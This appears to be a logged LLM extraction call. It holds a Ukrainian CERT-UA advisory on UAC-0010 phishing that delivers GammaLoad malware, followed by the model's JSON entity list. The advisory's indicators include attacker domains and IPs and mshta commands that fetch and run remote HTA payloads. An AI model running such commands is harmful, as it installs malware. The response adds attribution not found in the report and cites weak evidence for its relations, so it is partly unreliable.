@@ -1,0 +1,196 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision information extraction engine for cybersecurity incident reports (CERT-UA). You convert one report into a structured JSON object. You are NOT given a list of entity categories: describe each entity instead, and the categories will be discovered downstream from your descriptions.
+
+### WHAT TO EXTRACT ###
+1. `entities`: every concrete, named thing that matters in the incident: threat actors and groups, malware and tools, software products and versions, vendors, companies, government bodies, sectors, countries, domains, IP addresses, e-mail addresses, file names, vulnerabilities (CVE ids), persons, infrastructure, campaigns, techniques. Each entity is { "name", "kind", "gloss" }.
+   - `name`: the entity exactly as written in the text (original script and spelling; do not translate names). Use the most complete form that appears.
+   - `kind`: a generic type phrase in English, 1–4 lower-case words, saying what kind of thing this is. REUSE a label from the KNOWN KINDS list below whenever one fits; only when nothing fits, write your own phrase (e.g. "hacking group", "malware family", "software vendor"). Use the same phrase for entities of the same kind.
+   - `gloss`: ONE sentence in English, at most 25 words, saying WHAT KIND OF THING the entity is, in a way that would hold outside this report. Examples: "A Russian state-sponsored hacking group also known as APT28." / "A backdoor malware family delivered through malicious Office documents." / "A Ukrainian central executive body responsible for communications and information protection." / "An internet domain used to host a phishing page." Do NOT restate what the entity did in this incident beyond what is needed to say what it is.
+2. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two extracted entities, as { "head", "type", "tail", "evidence" }.
+   - `head` / `tail` MUST exactly match `name` values from `entities`. Direction: head acts on tail.
+   - `type`: a short lower-case verb phrase with hyphens (e.g. `attacks`, `uses`, `delivers`, `targets-sector`, `exploits`, `hosts`, `attributed-to`, `affects`, `located-in`, `part-of`, `sends-email-to`).
+   - REUSE a type from the KNOWN RELATION TYPES below whenever it fits. Introduce a new type only when none fits; then also list it in `newRelationTypes` with a one-line definition.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+3. `newRelationTypes`: [{ "name", "definition" }] for relation types you introduced; an empty array is the normal case.
+
+### KNOWN KINDS ###
+Kinds discovered from previously processed reports (label: definition). Reuse them when they fit.
+- Email Address: A unique electronic mail identifier used to send, receive, or route digital messages across networks. (also: Email, E-mail Address)
+- Country: A distinct sovereign nation, state, or territorial body with its own government and defined geographical borders. (also: Nation, Sovereign State)
+- Threat Actor: An individual or organized group responsible for conducting malicious cyber activities, espionage, or computer network attacks. (also: Threat Group, Cyber Threat Actor, Hacking Group)
+
+### KNOWN RELATION TYPES ###
+- located-in: Specifies the geographical country or territory where an organization or entity is located or based.
+- part-of: Indicates that an entity is a structural component, agency, or division of another entity.
+- uses: Indicates that an organization or actor employs a specific tool, platform, standard, or contact mechanism.
+
+### RULES ###
+- Do NOT extract "CERT-UA" itself (the reporting body), and do not extract generic technologies ("the internet", "computers", "e-mail") unless they name a specific system.
+- Deduplicate: one entry per distinct entity (the same thing written two ways is one entity; use the most complete form in `name`).
+- If a government body's name contains a country, also extract that country as its own entity.
+- Do not assign roles; `kind` and `gloss` together carry what the thing is.
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "entities": [...], "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "entities": [], "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p><strong>Загальна інформація</strong></p><p><span style="color: rgb(36, 36, 36);">Урядовою командою реагування на комп'ютерні надзвичайні події України CERT-UA отримано інформацію про факт розсилання електронних листів з темою "Щодо проведення акції помсти у Херсоні!", що містять вкладення у вигляді файлу "План Херсон.htm".</span></p><p><span style="color: rgb(36, 36, 36);">HTM-файл забезпечить декодування і створення на комп'ютері жертви файлу "Herson.rar", який містить файл-ярлик "План підходу та закладання вибухівки на об'єктах критичної інфростурктури Херсона.lnk".</span></p><p><span style="color: rgb(36, 36, 36);">Згаданий LNK-файл у разі його вікдриття забезпечить завантаження і запуск HTA-файлу "precarious.xml", що призведе до створення та виконання файлів "desktop.txt" і "user.txt".</span></p><p><span style="color: rgb(36, 36, 36);">В результаті, на комп'ютер буде завантажено шкідливу програму GammaLoad.PS1_v2 (імплементовано механізм виготовлення знімку екрану та його відправки на сервер управління).</span></p><p><span style="color: rgb(36, 36, 36);">Активність здійснюється групою UAC-0010 (Armageddon).</span></p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellcheck="false">4c434fafbdb64ee9c56a4e3007b1ef33&nbsp; &nbsp; b1bc659006938eb5912832eb8412c609d2d875c001ab411d1b69d343515291b7&nbsp; &nbsp; План Херсон.htm
+f94693b8def27e4555dc7ac6a25260d0&nbsp; &nbsp; f9b68f9a3e41bafa612bcadd6e4c5ef75870549164e50f6b7ec55d1edad90674&nbsp; &nbsp; Herson.rar
+a367898f46c7a8ce0ba6d6e9690cc4b7&nbsp; &nbsp; 94f4b54060f50523380082879ac262e67477acf5656aec3912078e1d756e9f1f&nbsp; &nbsp; План підходу та закладання вибухівки на об'єктах критичної інфростурктури Херсона.lnk
+c3ad33e72e37f2f9ee1f901a9dab3660&nbsp; &nbsp; 370da0474afb87623e070b83834472c307089533796940fb8ebbe9c8cf048c93&nbsp; &nbsp; rejection.xml
+8993c593f70cc133dc70198052517c57&nbsp; &nbsp; 95eb176f66026aef579d515a5d2563dc2310eff038c68807c433b3418699f902&nbsp; &nbsp; desktop.txt
+d9041a202ef19a778817aed83f547010&nbsp; &nbsp; 000696f213103798767ad0ea47acf60d9d475c45de4584a0e8625067c1b89ba7&nbsp; &nbsp; user.txt
+c3c41fda9f83f579f3912ca4e769b634&nbsp; &nbsp; 3a0796096af51af33a28361670e9af8a9791b04c83025c0a904a36b3d1962c2e&nbsp; &nbsp; get.php (GammaLoad.PS1_v2)
+
+
+(10.05.2022)
+fd49ac4b68e63ef4c44a08c05157b520&nbsp; &nbsp; 215d79d31ec6c4b008cf585dcf90007487b636229284b9ad924f52206c46a8a7&nbsp; &nbsp; Витяг з наказу.htm&nbsp;
+9e472931556b6f6e3c1e50d719df83f9&nbsp; &nbsp; f2f4dec274f0d7bd26c0d39e1cffc4b38b1e1919dfca6e20f754eddfa5931bbf&nbsp; &nbsp; 768_08.05.2022.rar
+76bdfe083b9038ab35757ba8cfac9a97&nbsp; &nbsp; 7a36935f624855f21c03b17b9b6e652f9b400aec79f6d1f221ef7380f2f9c02e&nbsp; &nbsp; Витяг з наказу Генерального штабу Збройних Сил України від 08.05.2022 №768.lnk
+</pre><p><br></p><p><em>Мережеві:</em></p><pre class="ql-syntax" spellcheck="false">sendmail[.]website
+a0671524.xsph[.]ru
+a0667987.xsph[.]ru
+qiwardos[.]ru
+nitikora[.]ru
+milotraf[.]ru
+nikotod[.]ru
+military-ukraine@sendmail.website
+coyote@sendmail.website
+194[.]58.121.198 (Received)
+92[.]53.116.145 (Received)
+216[.]128.131.233
+66[.]42.95.123
+hXXp://qiwardos[.]ru/get.php
+hXXp://qiwardos[.]ru/index.php
+hXXp://a0671524.xsph[.]ru/mo/faicon.ico
+hXXp://a0671524.xsph[.]ru/bandage/precarious.xml
+hXXp://a0667987.xsph[.]ru/zsu/faicon.ico
+hXXp://a0667987.xsph[.]ru/preparations/rejection.xml
+hXXps://icanhazip[.]com (Легітимний сервіс)
+</pre><p><br></p><p><em>Хостові:</em></p><pre class="ql-syntax" spellcheck="false">%WINDIR%\System32\mshta.exe http://a0671524.xsph.ru/bandage/precarious.xml /f
+%WINDIR%\System32\mshta.exe http://a0667987.xsph.ru/preparations/rejection.xml /f
+cmd.exe /c wscript.exe %USERPROFILE%\desktop.txt //b //e:VBScript
+%USERPROFILE%\desktop.txt
+</pre><p><br></p><p><strong>Графічні зображення</strong></p><p><strong>﻿</strong></p>
+
+=== RESPONSE (6.5s, in 3178 / out 1077 tok, STOP) ===
+UAC-0010 (Armageddon) conducted a cyber campaign targeting Ukrainian entities using phishing emails with malicious HTM/LNK attachments that drop and execute GammaLoad.PS1_v2 malware.
+
+```json
+{
+  "entities": [
+    {
+      "name": "Україна",
+      "kind": "Country",
+      "gloss": "A country in Eastern Europe."
+    },
+    {
+      "name": "UAC-0010 (Armageddon)",
+      "kind": "Threat Actor",
+      "gloss": "A Russian state-sponsored cyber espionage group associated with the FSB, targeting Ukrainian organizations."
+    },
+    {
+      "name": "GammaLoad.PS1_v2",
+      "kind": "malware",
+      "gloss": "A PowerShell-based malware family used by UAC-0010 to capture screenshots and exfiltrate data to C2 servers."
+    },
+    {
+      "name": "Генеральний штаб Збройних Сил України",
+      "kind": "military organization",
+      "gloss": "The central military administration body of the Armed Forces of Ukraine."
+    },
+    {
+      "name": "military-ukraine@sendmail.website",
+      "kind": "Email Address",
+      "gloss": "A malicious email address used to distribute phishing emails."
+    },
+    {
+      "name": "coyote@sendmail.website",
+      "kind": "Email Address",
+      "gloss": "A malicious email address used to distribute phishing emails."
+    },
+    {
+      "name": "sendmail.website",
+      "kind": "domain",
+      "gloss": "A domain name used by attackers for sending phishing emails."
+    },
+    {
+      "name": "a0671524.xsph.ru",
+      "kind": "domain",
+      "gloss": "A domain name hosting malicious payloads used in the cyberattack."
+    },
+    {
+      "name": "a0667987.xsph.ru",
+      "kind": "domain",
+      "gloss": "A domain name hosting malicious payloads used in the cyberattack."
+    },
+    {
+      "name": "qiwardos.ru",
+      "kind": "domain",
+      "gloss": "A command and control domain used by GammaLoad malware."
+    },
+    {
+      "name": "nitikora.ru",
+      "kind": "domain",
+      "gloss": "A malicious domain name associated with the threat actor's infrastructure."
+    },
+    {
+      "name": "milotraf.ru",
+      "kind": "domain",
+      "gloss": "A malicious domain name associated with the threat actor's infrastructure."
+    },
+    {
+      "name": "nikotod.ru",
+      "kind": "domain",
+      "gloss": "A malicious domain name associated with the threat actor's infrastructure."
+    },
+    {
+      "name": "icanhazip.com",
+      "kind": "domain",
+      "gloss": "A legitimate public IP address lookup service abused by malware."
+    },
+    {
+      "name": "194.58.121.198",
+      "kind": "ip address",
+      "gloss": "An IP address associated with malicious infrastructure."
+    },
+    {
+      "name": "92.53.116.145",
+      "kind": "ip address",
+      "gloss": "An IP address associated with malicious infrastructure."
+    },
+    {
+      "name": "216.128.131.233",
+      "kind": "ip address",
+      "gloss": "An IP address associated with malicious infrastructure."
+    },
+    {
+      "name": "66.42.95.123",
+      "kind": "ip address",
+      "gloss": "An IP address associated with malicious infrastructure."
+    }
+  ],
+  "relations": [
+    {
+      "head": "UAC-0010 (Armageddon)",
+      "type": "uses",
+      "tail": "GammaLoad.PS1_v2",
+      "evidence": "Активність здійснюється групою UAC-0010 (Armageddon)."
+    },
+    {
+      "head": "Генеральний штаб Збройних Сил України",
+      "type": "located-in",
+      "tail": "Україна",
+      "evidence": "Генерального штабу Збройних Сил України"
+    }
+  ],
+  "newRelationTypes": []
+}
+```
